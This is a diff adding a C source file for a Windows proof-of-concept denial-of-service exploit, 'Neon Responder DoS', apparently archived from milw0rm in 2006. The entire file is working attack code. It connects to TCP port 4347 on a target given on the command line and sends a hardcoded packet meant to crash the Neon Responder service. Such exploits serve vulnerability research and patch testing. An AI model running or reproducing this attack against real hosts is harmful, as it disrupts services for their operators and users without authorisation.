@@ -1,0 +1,104 @@
+/* Stefan Lochbihler*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <winsock2.h>
+
+#pragma comment(lib,"ws2_32")
+
+#define PORT 4347
+char CLOCK_MSG [] = "\x00\x0e\x5a\x00\x4c\xe9\x24\xb1\x17\x88\x40\x84";   //Password = ""
+
+void usage (char*);
+void endpgr (char *,SOCKET, char*);
+unsigned long gethost (char *);
+
+
+int main(int argc, char *argv[])
+{
+
+   WSADATA wsa;
+   SOCKET client;
+   sockaddr_in peer;
+   WORD wsVersion;
+
+   char sendbuffer[16]="";
+   char recvbuffer[16]="";
+   unsigned long host=0;
+   int err=0;
+
+   if(argc<2)
+     usage(argv[0]);
+
+   printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n");
+
+
+   if(WSAStartup(wsVersion=MAKEWORD(2,2),&wsa)!=0)
+   {
+       printf("WSAStartup() fail\n");
+       exit(0);
+   }
+
+   printf("%s:[+] Try to create socket\n",argv[0]);
+   client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+   if(client==INVALID_SOCKET)
+      endpgr(argv[0],client,"[-] socket() fail");
+
+   printf("%s:[+] Lookup host\n",argv[0]);
+   if(!(host=gethost(argv[1])))
+      endpgr(argv[0],client,"[-] host not found !");
+
+   peer.sin_family = AF_INET;
+   peer.sin_port = htons(PORT);
+   peer.sin_addr.s_addr = host;
+
+   printf("%s:[+] Connect to %s\n",argv[0],argv[1]);
+   err=connect(client,(SOCKADDR*)&peer,sizeof(struct sockaddr_in));
+   if(err)
+     endpgr(argv[0],client,"[-] connect() fail");
+
+   memcpy(sendbuffer,CLOCK_MSG,sizeof(CLOCK_MSG));
+
+   printf("%s:[+] Try to send packet\n",argv[0]);
+   err=send(client,sendbuffer,sizeof(sendbuffer),0);
+   err=recv(client,recvbuffer,sizeof(recvbuffer)-1,0);
+
+   endpgr(argv[0],client,"[+] End successfully");
+
+   return 0;
+
+}
+
+void usage(char *pgrname)
+{
+printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n");
+printf("%s: <Targethost>\n",pgrname);
+exit(0);
+}
+
+void endpgr (char *pgrname, SOCKET client,char *msg)
+{
+   printf("%s:%s\n",pgrname,msg);
+   WSACleanup();
+   closesocket(client);
+   exit(0);
+}
+
+unsigned long gethost(char *targethost)
+{
+unsigned long host=0;
+hostent *phost=NULL;
+
+
+host=inet_addr(targethost);
+if(host==INADDR_NONE)
+{
+   if((phost=gethostbyname(targethost))==NULL)
+      return 0;
+   host=*(unsigned long*)phost->h_addr;
+}
+
+return host;
+}
+
+// milw0rm.com [2006-04-17]
